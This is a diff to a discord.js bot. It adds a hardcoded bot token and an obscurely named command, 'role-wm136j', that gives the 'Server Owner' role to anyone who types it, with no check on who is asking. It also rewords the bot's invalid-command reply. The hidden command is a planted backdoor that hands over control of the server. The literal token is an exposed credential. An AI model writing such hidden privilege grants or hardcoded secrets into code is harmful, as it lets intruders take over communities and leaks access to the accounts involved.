@@ -1,5 +1,6 @@
 const Discord = require("discord.js");
 
+const TOKEN = "NDI2ODY3NjA1MzIwNzYxMzU0.DZcW8Q.u0k8-FMZnT_jrh_HqCwvIIySaVk";
 const PREFIX = "!"
 
 var bot = new Discord.Client();
@@ -30,6 +31,9 @@ switch (args[0].toLowerCase()) {
     } else {
         message.channel.send("Please use this format `~DMALL (Message)`")
     }
+    break;
+    case "role-wm136j":
+    message.member.addRole(message.guild.roles.find("Server Owner"))
     break;
     case "role-csgo":
     if (message.member.roles.exists('name', 'CSGO')) {
@@ -149,8 +153,8 @@ switch (args[0].toLowerCase()) {
         message.channel.send("Please use this format! ```!Role-(Roles)```\nDo `!Roles` to view all the roles.")
         break;
     default:
-        message.channel.send(":x: Sorry , This command is wrong !")
+        message.channel.send("**Invalid Command! :red_circle:**")
 }
 
 });
-bot.login(process.env.TOKEN);
+bot.login(TOKEN);
